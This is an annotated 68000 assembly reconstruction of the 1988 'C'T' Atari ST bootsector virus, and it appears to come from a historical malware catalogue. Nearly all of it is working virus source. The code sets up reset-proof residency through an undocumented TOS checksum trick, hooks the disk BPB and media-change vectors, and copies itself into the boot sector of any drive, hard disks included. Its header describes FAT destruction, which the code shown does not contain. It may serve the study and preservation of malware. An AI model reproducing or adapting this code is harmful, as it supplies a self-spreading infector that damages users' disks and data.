; Virus #7
;
; Name: C’T Virus.
; Type: Reset-proof memory-resident bootsector virus.
; Discovery date: Summer 1988 (Wim Nottroth).
; Virus can copy to drive(s): Any (including hard disk).
; Virus attaches itself to:
; - Undocumented reset-resistant.
; - hdv_mediach
; - hdv_bpb
; Disks can be immunized against it: Yes (executable).
; What can happen: Deletes FAT of floppy and hard disk (all data irretrievably lost).
; When does that happen: If date stamp is 1987.
; Reset-proof: Yes.
; Can copy to hard disk: Yes.
; Remark:
;  - This virus was featured in a German magazine called "Computer & Technik."
;  - The authors claimed they had ‘found it’ on one of their disks.
;  - A listing was included, so that people could reproduce and adapt the virus with ease.
;  - It writes the message "ARRRGGGHHH Diskvirus hat wieder zugeschlagen" on the screen when it is activated.
;  - Due to the fact that it forgets to check whether or not the device is higher than "B," it can also copy itself to hard disk (which will most likely cause permanent damage).


; ----------------------------------------------------------------------------------------------------------
; Constants
; ----------------------------------------------------------------------------------------------------------
FLOPPY_BUFFER               equ $4C6
RESIDENT_MAGIC              equ $12123456
RESIDENT_CHK                equ $5678
VIRUS_ID                    equ $07A31CDF
MEMTOP                      equ $436                ; long |End of TPA (user memory)                        |_memtop (0x0f8000 on 1040)
BOOTDEV                     equ $446                ; word |Default boot device, This value represents the device from which the system was booted (0 = A:, 1 = B:, etc.)                            |_bootdev
HDV_MEDIACH                 equ $47E                ; long |Vector for hard disk media change               |hdv_mediach
HDV_BPB                     equ $472                ; long |Vector for getbpb for hard disk                 |hdv_bpb
BOOTSECTOR_START            equ $611E
GENERATION_TRIGGER          equ $14

; variables location
; translated from original listing
; OFFSET structure, 30 bytes data, matching the size of the bootsector reserved floppy descriptor
OFFSET_MAGIC_WORD           equ $0            ;vir_mem      dc.l #12123456  ; First magic long word
OFFSET_RESIDENT_ADDRESS     equ $04           ;             dc.l $000f7e00  ; Start address in memory
OFFSET_BRA                  equ $08           ;             bra  vir_head   ; The second installation phase begins with this branch. (INSTALL_RESIDENT_VECTOR)
OFFSET_VIRUS_ID             equ $0A           ;             dc.l $07a31cdf  ; 2nd magic long word
OFFSET_GENERATION           equ $0E           ;             dc.w $0010      ; Age of the virus
OFFSET_OLD_HDV_BPB          equ $10           ;             dc.l $00fc0de6  ; old vector hdv_bpb
OFFSET_OLD_HBD_MEDIACH      equ $14           ;             dc.l $00fc0f96  ; old vector hdb_mediach
OFFSET_DISKDATA1            equ $18           ;             dc.w $0900      ; Remains of the diskette structure information
OFFSET_DISKDATA2            equ $1A           ;             dc.w $0100
OFFSET_DISKDATA3            equ $1C           ;             dc.w $0000
OFFSET_RES_INSTALL_BRA      equ $1E           ;vir_head     bra  install_3  ; (SET_SYSTEM_VECTORS)

GENERATION                  equ START-$12     ; 0x0e
OLD_HDV_BPB_VECTOR          equ START-$10
OLD_HDV_MEDIACH_VECTOR      equ START-$C
SET_SYSTEM_VECTORS_BRANCH   equ START-2

BOOT_GENERATION_OFFSET      equ $e

        TEXT

; ----------------------------------------------------------------------------------------------------------
; Is used by
; ----------------------------------------------------------------------------------------------------------
HEADER:
        BRA.s     SET_SYSTEM_VECTORS

; ----------------------------------------------------------------------------------------------------------
; Code entry
; The system transfers control to the START routine as soon as the boot sector read is recognized as executable.
; ----------------------------------------------------------------------------------------------------------
START:
        MOVEA.L   (sp)+,A0                          ; poping the stack returns the starting memory address
                                                    ; as the bootsector start is BSR $20 (0x611e), return address in the stack
        SUBQ.L    #2,A0                             ; A0 points now to the begining of the bootsector in DSKBUFP

        SUBA.L    A2,A2                             ; clear A2
        MOVEA.L   MEMTOP(A2),A1                     ; A1 = 0x436 => _memtop: $long |End of TPA (user memory),
                                                    ; This value points to the highest memory location available for the system heap.
                                                    ; This value is used to initialize GEMDOS free memory.
        SUBA.W    #$200,A1                          ; go to memtop - 512 bytes => A1

        CMPI.L    #RESIDENT_MAGIC,(A1)              ; check if resident vector is already setup
        BNE.S     INSTALL_RESIDENT_VECTOR
        CMPI.L    #VIRUS_ID,10(A1)                  ; check resident vector is the virus vector using virus identifier
        BNE       INSTALL_RESIDENT_VECTOR
        RTS

; ----------------------------------------------------------------------------------------------------------
; Install virus in resident memory using undocumented trick
; Structure:
; 0.L: Magic value (RESIDENT_MAGIC)
; 4.L: Resident program address (A1=MEMTOP-$200) aligned at 512 bytes boundary
; 8.L: Resident code
; Double page (512 bytes) checksum has to be $5678
; At next reset, this part will be executed (and deleted)
; ----------------------------------------------------------------------------------------------------------
INSTALL_RESIDENT_VECTOR:
        ; Set the preprogram variables OFFSET_ structure which fits the resident program constraints and the boot sector reserved block
        MOVE.W    BOOT_GENERATION_OFFSET(A0),OFFSET_GENERATION(A0)         ; copy the generation counter from the bootsector to the generation variable
        MOVE.L    #RESIDENT_MAGIC,(A0)                          ; Add magic word 0x12123456 that TOS looks for
        MOVE.L    A1,OFFSET_RESIDENT_ADDRESS(A0)                ; add vector address
        MOVE.W    #$6014,OFFSET_BRA(A0)                         ; add branch to 22 (0x16) to jump over the data and reach the next BRA
        MOVE.L    #VIRUS_ID,OFFSET_VIRUS_ID(A0)                 ; add virus identifier
        MOVE.L    HDV_BPB(A2),OFFSET_OLD_HDV_BPB(A0)            ; add hdv_bpb vector
        MOVE.L    HDV_MEDIACH(A2),OFFSET_OLD_HBD_MEDIACH(A0)    ; add hdv_mediach vector

        ; compute magic checksum
        CLR.W     D1                                ; clear d1
        MOVE.W    #$FE,D0                           ; for d0 = 254 to 0
.copy_and_calc_checksum:
        MOVE.W    (A0),(A1)+                        ; copy
        ADD.W     (A0)+,D1                          ; compute work checksum
        DBF       D0,.copy_and_calc_checksum
        NEG.W     D1                                ; negate checksum
        ADD.W     #RESIDENT_CHK,D1                  ; add RESIDENT_CHK
        MOVE.W    D1,(A1)                           ; add checksum to A1
        RTS

; ----------------------------------------------------------------------------------------------------------
; SET_SYSTEM_VECTORS
; ----------------------------------------------------------------------------------------------------------
SET_SYSTEM_VECTORS:
        SUBA.L    A2,A2                             ; A2 = 0
        SUBI.L    #$200,MEMTOP(A2)                  ; Change memtop to protect itself by reducing of 512 bytes
        SUBI.L    #$200,$496(A2)                    ; Change Gemdos first free memory block 0f 512 bytes

        ; $00048E|long |Memory descriptor block                              |themd
        ;    typedef struct md
        ;    {
        ;       struct md *m_link; /* pointer to next block $48e*/
        ;       VOIDP m_start; /* pointer to start of block $492*/
        ;   =>  LONG m_length; /* length of block $496 */
        ;       BASEPAGE *m_own; /* pointer to basepage of owner $49A*/
        ;    } MD;

        LEA       HDV_BPB_VECTOR(PC),A0
        MOVE.L    A0,HDV_BPB(A2)                    ; set HDV_BPB_VECTOR in hdv_bpb vector

        LEA       HDV_MEDIACH_VECTOR(PC),A0
        MOVE.L    A0,HDV_MEDIACH(A2)                ; set HDV_BPB_VECTOR in hdv_mediach vector

        MOVE.W    BOOTDEV(A2),-(sp)                 ; store default device in stack
        BSR.S     REPLICATE                         ; replicate the virus
        ADDQ.L    #2,sp                             ; fix stack
        RTS

; ----------------------------------------------------------------------------------------------------------
; HDV_MEDIACH_VECTOR will be installed in vector
; ----------------------------------------------------------------------------------------------------------
HDV_MEDIACH_VECTOR:
        MOVE.W    4(sp),-(sp)                       ; by spec
        MOVEA.L   OLD_HDV_MEDIACH_VECTOR(PC),A0     ; get back original vector
        JSR       (A0)                              ; jmp to it
        ADDQ.L    #2,sp                             ; fix stack
        TST.W     D0                                ; check harddrive attached
        BLE       .on_hardrive_attached
        MOVE.W    4(sp),-(sp)                       ; add bootdev to stack
        BSR.S     REPLICATE                         ; if ok, call Replicate
        ADDQ.L    #2,sp                             ; fix stack
.on_hardrive_attached:
        RTS

; ----------------------------------------------------------------------------------------------------------
; HDV_BPB_VECTOR will be installed in vector
; ----------------------------------------------------------------------------------------------------------
HDV_BPB_VECTOR:
        MOVE.W    4(sp),-(sp)                       ; by specs
        BSR.S     REPLICATE                         ; call replicate
        ADDQ.L    #2,sp                             ; fix stack
        MOVEA.L   OLD_HDV_BPB_VECTOR(PC),A0         ; get back original vector
        JMP       (A0)                              ; jmp to it

; ----------------------------------------------------------------------------------------------------------
; Replication routine
; stack: bootdev.W
; ----------------------------------------------------------------------------------------------------------
REPLICATE:
        MOVEM.L   A0-A3/D0-D2,-(sp)
        MOVEA.L   FLOPPY_BUFFER.L,A3                ; floppy buffer addr in A3
        MOVE.W    4(sp),-(sp)                       ; dev = get bootdev from stack? BSR + 2 on stack

        ; read bootsector
        CLR.W     -(sp)                             ; recno = 0
        MOVE.W    #1,-(sp)                          ; count = 1
        PEA       (A3)                              ; buf = A3
        MOVE.W    #2,-(sp)                          ; mode = 0010 / read, don't read media change status
        MOVE.W    #4,-(sp)                          ; LONG Rwabs( mode, buf, count, recno, dev)
        TRAP      #$D
        ADDA.W    #$E,sp                            ; fix stack
        TST.L     D0                                ; check for error
        BNE       .do_nothing
        MOVEA.L   A3,A0                             ; copy buffer addr to A0
        CLR.W     D1                                ; d1 = 0
        MOVE.W    #$FF,D0                           ; for D0 = 255 to 0
.calc_checksum:
        ADD.W     (A0)+,D1                          ; calc word checksum
        DBF       D0,.calc_checksum
        CMP.W     #$1234,D1                         ; check if already executable
        BEQ.S     .do_nothing

        ; create bootsector buffer with virus
        MOVEA.L   A3,A0                             ; if not, copy buffer addr in A0
        MOVE.W    #BOOTSECTOR_START,(A0)+           ; add bootsector branch
        MOVE.L    #VIRUS_ID,(A0)+                   ; add virus identifier

        MOVE.W    GENERATION(PC),D0                 ; get relocated counter in d0
        ADDQ.W    #1,D0                             ; d0 = d0 + 1
        MOVE.W    D0,(A0)+                          ; copy incremented counter to buffer

        ADDA.W    #$16,A0                           ; advance buffer of 22 bytes
        LEA       SET_SYSTEM_VECTORS_BRANCH(PC),A1  ; A1 =  SET_SYSTEM_VECTORS_BRANCH (START - 2) with bra
        MOVE.W    #$F0,D0                           ; for d0 = 240 to 0
.copy:
        MOVE.W    (A1)+,(A0)+                       ; copy virus to buffer
        DBF       D0,.copy

        ; generate bootsector from buffer
        MOVE.W    #1,-(sp)                          ; execflag = 1 (executable)
        MOVE.W    #$FFFF,-(sp)                      ; type unchanged
        MOVE.L    #$FFFFFFFF,-(sp)                  ; serial
        PEA       (A3)                              ; buffer
        MOVE.W    #$12,-(sp)                        ; VOID Protobt( buf, serial, type, execflag ) => create bootsector
        TRAP      #$E
        ADDA.W    #$E,sp                            ; fix stack

        ; write back bootsector
        MOVE.W    4(sp),-(sp)                       ; dev = get bootdev from stack
        CLR.W     -(sp)                             ; recno = 0
        MOVE.W    #1,-(sp)                          ; count = 1
        PEA       (A3)                              ; buffer
        MOVE.W    #3,-(sp)                          ; mode = 0011 / Write, keep media change status
        MOVE.W    #4,-(sp)                          ; LONG Rwabs( mode, buf, count, recno, dev)
        TRAP      #$D
        ADDA.W    #$E,sp                            ; fix stack

        MOVE.W    GENERATION(PC),D0                 ; get counter in D0
        CMP.W     #GENERATION_TRIGGER,D0            ; if d0 == GENERATION_TRIGGER  (in $f7f78)
        BLE       .do_nothing
        BSR.S     PRINT_MESSAGE                     ; print message
.do_nothing:
        MOVEM.L   (sp)+,A0-A3/D0-D2
        RTS

; ----------------------------------------------------------------------------------------------------------
; Print message routine
; ----------------------------------------------------------------------------------------------------------
PRINT_MESSAGE:
        MOVE.L    A3,-(sp)                          ; keep A3 address in stack
        LEA       MESSAGE(PC),A3                    ; A3: message ptr
.decode_and_print:
        MOVE.B    (A3)+,D0                          ; get next character in d0
        BEQ.S     .end_of_message                   ; if not 0
        EORI.B    #$55,D0                           ; d0 = d0 XOR 85
        ROR.B     #3,D0                             ; d0 = d0 ROR 3
        MOVE.W    D0,-(sp)                          ; ch = d0
        MOVE.W    #2,-(sp)                          ; dev = 2 (Screen)
        MOVE.W    #3,-(sp)                          ; LONG Bconout(word dev, word ch)
        TRAP      #$D                               ; Bios
        ADDQ.L    #6,sp                             ; fix stack
        BRA.S     .decode_and_print                 ; loop
.end_of_message:
        MOVEA.L   (sp)+,A3                          ; reset A3
        RTS

; ----------------------------------------------------------------------------------------------------------
; data
; ----------------------------------------------------------------------------------------------------------
MESSAGE:
        ;      'ARRRGGGHHH <inverseVideo>Diskvirus</inverseVideo> hat wieder zugeschlagen' encoded
        DC.B      $5F,$C7,$C7,$C7,$C7,$6F,$6F,$6F
        DC.B      $17,$17,$17,$17,$54,$5C,$54,$8D
        DC.B      $D6,$54,$77,$1E,$CE,$0E,$E7,$1E
        DC.B      $C6,$FE,$CE,$54,$8D,$DE,$54,$16
        DC.B      $5E,$F6,$54,$EE,$1E,$7E,$76,$7E
        DC.B      $C6,$54,$86,$FE,$6E,$7E,$CE,$4E
        DC.B      $16,$36,$5E,$6E,$7E,$26
        DC.B      $54,$5C
        DC.B      $3D,$05,$00,$00,$00,$00,$00,$00
        DC.B      $00,$00,$00,$00,$00,$00,$00,$00
        DC.B      $00,$00,$00,$00,$00,$00,$00,$00
        DC.B      $00,$00
        DC.W      $1234

    END
